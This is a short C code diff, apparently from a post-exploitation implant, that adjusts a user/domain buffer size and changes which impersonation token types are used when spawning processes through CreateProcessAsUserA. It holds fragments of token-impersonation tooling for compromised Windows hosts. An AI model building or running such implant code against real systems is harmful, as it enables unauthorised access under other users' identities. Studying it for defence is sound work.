@@ -256,7 +256,7 @@ PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
         return NULL;
     }
 
-    *UserSize  = UserNameSize + 1 + DomainSize + 5;
+    *UserSize  = UserNameSize + 1 + DomainSize;
     UserDomain = Instance->Win32.LocalAlloc( LPTR, *UserSize );
 
     StringConcatA( UserDomain, Domain );
@@ -365,6 +365,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     if ( Instance->Tokens.Impersonate )
     {
         PUTS( "Impersonate" )
+
         TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );
         CommandLineW = Instance->Win32.LocalAlloc( LPTR, CommandLineSize * 2 );
         CharStringToWCharString( CommandLineW, CmdLine, CommandLineSize );
@@ -381,7 +382,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                 goto Cleanup;
             }
         }
-        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_LOCAL || Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
+        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
         {
             if ( ! Instance->Win32.CreateProcessAsUserA(
                         Instance->Tokens.Token->lpUser,
